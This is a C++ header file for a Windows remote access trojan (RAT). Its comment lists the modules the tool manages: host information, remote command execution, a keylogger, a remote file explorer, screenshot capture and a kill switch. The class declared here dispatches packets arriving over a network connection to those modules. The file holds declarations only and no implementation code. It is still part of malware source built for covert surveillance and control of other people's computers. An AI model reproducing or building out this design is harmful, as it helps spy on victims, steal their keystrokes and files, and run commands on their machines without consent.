#ifndef OBJMGR_H
#define OBJMGR_H

#include <Windows.h>
#include <vector>
#include "bone_obj.h"
#include "connect.h"
/*
##################################################################
#    A list to manage features obj                               #
#    Default Objects:                                            #
#    0. Info obj:	       Computer info, RAT info               #
#    1. Cmd obj:	       Remote Cmd                            #
#    2. Keylogger obj:     Log key stroke                        #
#    3. File Explorer obj: Remote file explorer                  #
#    4. Screenshot obj:    Capture screenshot                    #
#    5. Switch obj:        Kill or close RAT                     #
##################################################################
*/
class ObjMgr
{
public:
	bool	RegisterObj(BoneObj*);
	bool	ClearObjList();
	bool	OnPacketArrived(BYTE*, size_t);
	void	OnExit();
	ObjMgr();
	~ObjMgr();
private:
	BoneObj* GetObjByID(int);
	std::vector<BoneObj*> objList;
	Connection*	ConnObj;
};

#endif